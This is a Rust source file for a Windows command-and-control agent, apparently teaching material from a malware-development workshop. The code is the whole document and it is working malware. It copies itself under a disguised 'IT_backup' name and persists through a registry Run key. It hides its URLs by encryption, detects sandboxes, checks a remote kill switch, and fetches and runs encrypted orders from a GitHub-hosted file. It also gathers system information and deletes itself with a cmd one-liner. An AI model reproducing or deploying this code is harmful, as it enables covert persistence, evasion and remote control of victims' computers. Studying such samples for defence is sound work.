use dirs;
use dns_lookup::lookup_host;
use malware_examples::encryption::generate_salt;
use malware_examples::{command_engine::execute_orders, encryption, systeminfo::get_sys_info};
use reqwest::blocking::get;
use std::env;
use std::fs::{self, File};
use std::io::{self, Error, Read, Write};
use std::net::IpAddr;
use std::path::Path;
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;
use winreg::{enums::*, RegKey};

// Vars
const SYS_INFO_FILE_NAME: &str = "info.txt";
const UPDATE_FILE_NAME: &str = "update.txt";

const PERSISTENT_REGISTRY_NAME: &str = "ITbackup";

const IS_DEV: bool = false;

// Resolve Domain
fn resolve_domain_name(domain: &str) -> Result<Vec<IpAddr>, String> {
    match lookup_host(domain) {
        Ok(ips) => Ok(ips),
        Err(e) => Err(format!("Failed to resolve domain {}: {}", domain, e)),
    }
}

/**
 * Downloads a file and returns the contents of the body
 */
fn get_file(url: &str) -> Result<String, &str> {
    // Getting content from page
    match get(url) {
        Ok(mut response) => {
            // Check if the status is 200 OK
            if response.status().is_success() {
                let mut body_content = String::new();
                response
                    .read_to_string(&mut body_content)
                    .expect("Failed to read from file");
                Ok(body_content)
            } else {
                return Err("Failed to open");
            }
        }
        Err(_) => Err("we dont need proper error statements. Why not?"),
    }
}

/**
 * Move file
 */
fn move_program(source: &str, destination: &str) -> io::Result<()> {
    let destination_path = Path::new(destination);

    // Create the parent directory if it doesn't exist
    if let Some(parent) = destination_path.parent() {
        if !parent.exists() {
            fs::create_dir_all(parent)?;
        }
    }

    fs::copy(source, destination)?;
    fs::remove_file(source)?;
    Ok(())
}

/**
 * checks if the given executable exists within registry persistence
 */
fn check_registry_persistence(executable_path: &Path) -> Result<bool, String> {
    let persistence_path = match RegKey::predef(HKEY_CURRENT_USER)
        .open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
    {
        Ok(path) => path,
        Err(e) => return Err(format!("Error opening registry subkey: {}", e)),
    };

    let value_str: String = match persistence_path.get_value(PERSISTENT_REGISTRY_NAME) {
        Ok(val) => val,
        Err(_) => return Ok(false), // If the value doesn't exist, return false
    };

    Ok(value_str == executable_path.to_str().unwrap().to_string())
}

/**
 * Creates persistence for a given executable in the registry
 */
fn create_registry_persistence(executable_path: &Path) -> Result<(), String> {
    match check_registry_persistence(executable_path) {
        Ok(true) => Ok(()), // If persistence already exists, return Ok
        Ok(false) => {
            let hklm = RegKey::predef(HKEY_CURRENT_USER);
            let (persistence_path, _) = hklm
                .create_subkey_with_flags(
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                    KEY_WRITE | KEY_WOW64_64KEY,
                )
                .map_err(|e| format!("Error creating/opening registry subkey: {}", e))?;

            persistence_path
                .set_value(PERSISTENT_REGISTRY_NAME, &executable_path.to_str().unwrap())
                .map_err(|e| format!("Error setting registry value: {}", e))?;
            Ok(())
        }
        Err(e) => Err(e), // If an error occurs, return the error
    }
}

fn remove_registry_persistence() -> Result<(), String> {
    let hklm = RegKey::predef(HKEY_CURRENT_USER);
    let persistence_path = hklm
        .open_subkey_with_flags(
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            KEY_READ | KEY_WRITE | KEY_WOW64_64KEY,
        )
        .map_err(|e| format!("Error opening registry subkey: {}", e))?;

    match persistence_path.get_value::<String, _>("notsus") {
        Ok(_) => {
            persistence_path
                .delete_value("notsus")
                .map_err(|e| format!("Error deleting registry value: {}", e))?;
            Ok(())
        }
        Err(_) => Ok(()),
    }
}

fn delete_path(path: &str) -> Result<(), Error> {
    let metadata = fs::metadata(path)?;
    if metadata.is_dir() {
        fs::remove_dir_all(path)?;
        println!("Directory {} and its contents deleted.", path);
    } else {
        fs::remove_file(path)?;
        println!("File {} deleted.", path);
    }
    Ok(())
}

pub fn main_uninstall() {
    thread::sleep(Duration::from_secs(1));
    let current_exe = env::current_exe().unwrap();
    let current_exe_str = current_exe.to_str().unwrap();

    let cmd = format!(
        "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"{}\"",
        current_exe_str
    );

    Command::new("cmd")
        .args(&["/C", &cmd])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .unwrap();
}

fn main() -> Result<(), String> {
    // Setting up global paths
    let sys_info_file_path: &Path = Path::new(SYS_INFO_FILE_NAME);
    let update_file_path: &Path = Path::new(UPDATE_FILE_NAME);
    let current_path = std::env::current_exe().expect("Failed to get current executable path");
    let home_path = dirs::cache_dir().unwrap();
    let buff_path: std::path::PathBuf = home_path.join("IT_backup\\c2-agent.exe");
    let mal_home_path: std::path::PathBuf = home_path.join("IT_backup\\");
    let destination_path = buff_path.as_path();

    /***********************************************/
    /*                Domains Check                */
    /***********************************************/
    // Decrypt the data using the provided constants
    let our_encoded_domain: &str = "0431fc1415fe11294d4ac48c136b2eb4,00000000000000000000000000000000000000000000000000000000000000004743441f010a455c445748065e5c"; // www.github.com

    let decoded_domain = encryption::decrypt_format(our_encoded_domain);

    //check for github
    match resolve_domain_name(decoded_domain.as_str()) {
        Ok(_) => {
            // Domain exists, continue with the program
        }
        Err(e) => {
            eprintln!("Failed to resolve domain: {}", e);
            std::process::exit(1); // Exit the program with a non-zero status code
        }
    }
    // Decrypt the data using the provided constants
    let our_encoded_sandbox_check: &str = "692127766e6cba3e865c4f01c71eb2d0,00000000000000000000000000000000000000000000000000000000000000005e4d4641410d1819550d53000908550a4a59401150095d500a59581600570d5e514a535f5655584e18005216"; // https://checkiforourdomainisbeingsandbox.edu
    let decoded_sandbox_check = encryption::decrypt_format(our_encoded_sandbox_check);
    //check for sandboxing
    match resolve_domain_name(decoded_sandbox_check.as_str()) {
        Ok(_) => return Ok(()), // Exit if the domain exists
        Err(_) => (),           // Errors are suppressed, no output
    }

    // Check if Kill switch is there
    let encoded_kill_order = encryption::decrypt_format("4f46802515cbc3cdd813c12825f13ecd,00000000000000000000000000000000000000000000000000000000000000005c1240464b0a1d1a565c170a16514d070b551e670b435759467909525800112a5d055f755744464754590f4d39673456540a041c1743575d1d5807585d4a2e05581155445d1d765047500f0d135e060a101770401054464b1d5e0f5d5f4b171c40"); //https://github.com/ThreatLockerNickCottrell/ZTW2025/tree/main/Malware-Development/Assets/kill.txt

    match get_file(encoded_kill_order.as_str()) {
        Ok(_) => {
            if mal_home_path.exists() {
                match delete_path(mal_home_path.to_str().unwrap()) {
                    Ok(_) => println!("File deletion successful."),
                    Err(e) => eprintln!("Failed to delete file: {}", e),
                }
            }
            let _ = remove_registry_persistence();
            main_uninstall();
            return Ok(());
        }
        Err(_) => {
            // Errors are suppressed, no output
        }
    }


    //Check if the malware is already installed

    match check_registry_persistence(destination_path) {
        Ok(true) => (),
        Ok(false) => {
            let _ = move_program(
                current_path.to_str().unwrap(),
                destination_path.to_str().unwrap(),
            );
            let _ = create_registry_persistence(destination_path);
        }
        Err(e) => {
            eprintln!("Error checking registry persistence: {}", e);
            return Err(e.to_string());
        }
    }

    //Check if system info file exists. If it doesn't, create the file and pass in content
    // Getting new orders from github repo

    if current_path.ends_with(destination_path) {
        let encoded_order_content: &str = "692127766e6cba3e865c4f01c71eb2d0,00000000000000000000000000000000000000000000000000000000000000005e4d4641410d18194404414d0508470d4d5440105114535e0d43540b161c075f5b166659405256427a0a550807137d0c5b5d760c401242540f5b1e3f36655600040c1d43575144195e005707114e5e0451581a2e550a475011521c210744015c59495f545c43187745165317114e46155c5741061a124845"; // https://github.com/ThreatLockerNickCottrell/ZTW2025/tree/main/Malware-Development/Assets/update.txt
        let decoded_order_content = encryption::decrypt_format(encoded_order_content);
        let order_content = if IS_DEV {
            let mut content = String::new();
            let mut dev_file = File::open("dev-update.txt").expect("fml");
            dev_file.read_to_string(&mut content).expect("fml");
            content
        } else {
            get_file(decoded_order_content.as_str()).expect("Failed to get update file")
        };

        if current_path.ends_with(destination_path) {
            let sysinfo_generated_salt = generate_salt();

            if !sys_info_file_path.exists() {
                let mut sys_info_file =
                    File::create(sys_info_file_path).expect("Failed to open sysinfo file");
                sys_info_file
                    .write_all(
                        encryption::encrypt_format(
                            get_sys_info().as_str(),
                            sysinfo_generated_salt.as_str(),
                        )
                        .as_bytes(),
                    )
                    .expect("Failed to write data to sysinfo file");
                sys_info_file.flush().expect("Failed to flush sysinfo file");
            }
        }
        // Check that orders exists and has contents
        let mut archive_content = String::new();

        if update_file_path.exists() {
            let mut update_file =
                File::open(update_file_path).expect("Failed to access update cache");
            update_file
                .read_to_string(&mut archive_content)
                .expect("Failed to access update cache");
        }
        //let order_content = order_content
        if !update_file_path.exists() || archive_content != order_content {
            // if they don't exist, then execute all orders in file
            let decrypted_orders = encryption::decrypt_format(&order_content);
            println!("data \n{}", decrypted_orders);
            match execute_orders(&decrypted_orders) {
                _ => (),
            };
        }

        // after executing all orders, place orders into path
        let mut update_file = File::create(update_file_path).expect("Failed to open update cache");
        update_file
            .write_all(order_content.as_bytes())
            .expect("Failed to update cache");
        update_file.flush().expect("Failed to update cache");
    }
    // check if its on its first install location or its ins destination_path
    if current_path.ends_with(destination_path) {
        println!("You are in the desired directory!");
    } else {
        println!("You are not in the desired directory.");
        main_uninstall();
    }

    return Ok(());
}
